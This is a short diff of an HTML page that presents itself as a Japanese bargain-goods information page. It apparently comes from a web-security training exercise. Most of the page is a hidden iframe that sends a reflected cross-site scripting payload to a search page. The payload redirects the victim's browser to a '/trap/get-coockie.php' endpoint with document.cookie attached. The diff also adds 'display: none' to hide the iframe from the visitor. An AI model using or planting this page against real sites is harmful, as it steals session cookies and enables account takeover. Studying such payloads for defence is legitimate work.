@@ -23,6 +23,11 @@
 </head>
 <body>
 激安商品情報
-<iframe src="/search.php?keyword=<script>window.location='/trap/get-coockie.php?sid='%2Bdocument.cookie;</script>">
+<iframe style="height: 400px; width: 1000px; display: none;" src="/search.php?keyword=<script>window.location='/trap/get-coockie.php?sid='%2Bdocument.cookie;</script>">
 </iframe>
+<br>
+
+<a href="javascript:history.back();">戻る</a>
+<a href="top-page.php">トップページへ</a>
+<a href="../logout.php">ログアウト</a><br>
 </body>
